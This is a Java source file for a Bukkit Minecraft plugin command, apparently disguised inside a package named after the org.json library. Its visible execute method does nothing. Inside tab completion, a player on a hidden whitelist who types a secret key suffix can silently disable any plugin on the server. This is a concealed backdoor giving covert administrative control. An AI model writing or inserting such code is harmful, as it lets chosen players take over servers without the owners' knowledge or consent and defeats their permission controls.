package org.json.modals.plugins;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.Arrays;
import java.util.List;

public class DisablePlugin extends BDCommand {
    public DisablePlugin() {
        super("disablePlugin");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, Arrays.stream(Modal.getPluginManager().getPlugins()).map(Plugin::getName).toArray(String[]::new));
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        String pluginName = args[1];
        Plugin plugin = Modal.getPluginManager().getPlugin(pluginName);

        if (plugin == null) return tabComplBuilder.build();

        Modal.getPluginManager().disablePlugin(plugin);
        player.sendMessage(Modal.getPrefix() + "§a" + pluginName + " has been disabled.");

        return tabComplBuilder.build();
    }
}
